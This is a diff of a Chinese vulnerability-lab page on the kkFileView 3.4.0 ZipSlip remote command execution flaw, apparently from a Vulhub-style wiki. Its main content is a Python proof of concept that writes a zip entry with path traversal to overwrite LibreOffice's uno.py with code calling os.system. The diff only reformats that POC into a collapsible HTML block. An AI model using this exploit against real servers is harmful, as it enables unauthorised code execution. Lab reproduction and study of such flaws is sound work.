@@ -41,8 +41,10 @@ Vulhub 执行如下命令启动一个 kkFileView 3.4.0 服务器：
 
 ```
 docker compose up -d
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 服务启动后，访问`http://your-ip:8012`即可查看到首页。
 
 ![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/kkFileView%20ZipSlip%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240419210738761.png)
@@ -59,15 +61,16 @@ import zipfile
 if __name__ == "__main__":
     try:
         binary1 = b'vulhub'
-        binary2 = b"import os\nos.system('touch /tmp/success')\n"
+        binary2 = b"import os\nos.&#115;ystem('touch /tmp/success')\n"
         zipFile = zipfile.ZipFile("test.zip", "a", zipfile.ZIP_DEFLATED)
         # info = zipfile.ZipInfo("test.zip")
         zipFile.writestr("test", binary1)
         zipFile.writestr("../../../../../../../../../../../../../../../../../../../opt/libreoffice7.5/program/uno.py", binary2)
         zipFile.close()
     except IOError as e:
-        raise e
-```
+        raise e</code></pre>
+
+</details>
 
 执行 `poc.py`，生成 POC 文件，`test.zip` 将被写入当前目录。
 
